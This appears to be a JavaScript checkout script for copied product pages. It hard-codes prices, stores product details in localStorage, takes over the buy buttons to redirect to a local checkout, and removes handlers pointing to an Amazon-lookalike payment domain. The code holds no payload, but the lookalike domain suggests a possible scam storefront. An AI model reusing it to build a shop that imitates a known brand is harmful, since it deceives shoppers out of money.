(() => {
  // Fonte oficial de preços (index.html principal)
  const MAIN_SITE_PRICE_BY_PRODUCT_ID = {
    '1': 89.90,
    '2': 84.90,
    '3': 79.90,
    '4': 84.90,
    '5': 74.90,
    '6': 74.49,
    '7': 83.90,
    '8': 89.90,
    '9': 84.90,
    '10': 69.90,
  };

  function getProductIdFromPath() {
    const parts = window.location.pathname.split('/').filter(Boolean);
    if (parts.length === 0) return '';
    const candidate = parts[parts.length - 2] || parts[parts.length - 1];
    return /^\d+$/.test(candidate) ? candidate : '';
  }

  function parsePriceFromText(text) {
    if (!text) return 0;
    const normalized = text
      .replace(/\s+/g, ' ')
      .replace(/[Rr]\$/g, '')
      .replace(/\./g, '')
      .replace(',', '.');
    const match = normalized.match(/(\d+(?:\.\d{1,2})?)/);
    return match ? Number(match[1]) : 0;
  }

  function getPrice() {
    const productId = getProductIdFromPath();
    if (productId && MAIN_SITE_PRICE_BY_PRODUCT_ID[productId]) {
      return MAIN_SITE_PRICE_BY_PRODUCT_ID[productId];
    }

    const priceSection = document.querySelector('.price-section');
    if (priceSection) {
      const val = parsePriceFromText(priceSection.textContent || '');
      if (val > 0) return val;
    }

    const priceEl = document.querySelector('.price');
    if (priceEl) {
      const val = parsePriceFromText(priceEl.textContent || '');
      if (val > 0) return val;
    }

    return 0;
  }

  function getProductName() {
    const title = document.querySelector('.title') || document.querySelector('.product-title');
    return (title?.textContent || 'Produto').trim();
  }

  function getProductImage() {
    const img = document.querySelector('.carousel-images img') || document.querySelector('.product-image') || document.querySelector('img');
    return img?.src || '';
  }

  function startCheckout(event) {
    if (event) event.preventDefault();

    const price = getPrice();
    if (!price || Number.isNaN(price)) {
      alert('Nao foi possivel identificar o preco deste produto.');
      return;
    }

    localStorage.setItem('product_name', getProductName());
    localStorage.setItem('product_image', getProductImage());
    localStorage.setItem('product_price', String(price.toFixed(2)));
    localStorage.setItem('checkout_quantidade', '1');
    localStorage.setItem('checkout_total', String(price.toFixed(2)));

    window.location.href = 'http://127.0.0.1:8080/checkout/index.html';
  }

  window.startCheckoutLocal = startCheckout;

  const buttons = document.querySelectorAll('.buy-now, .add-to-cart');
  buttons.forEach((btn) => {
    btn.addEventListener('click', startCheckout);
    const onclickRaw = btn.getAttribute('onclick') || '';
    if (onclickRaw.includes('pay.amazon-seguro.shop')) {
      btn.removeAttribute('onclick');
    }
  });
})();
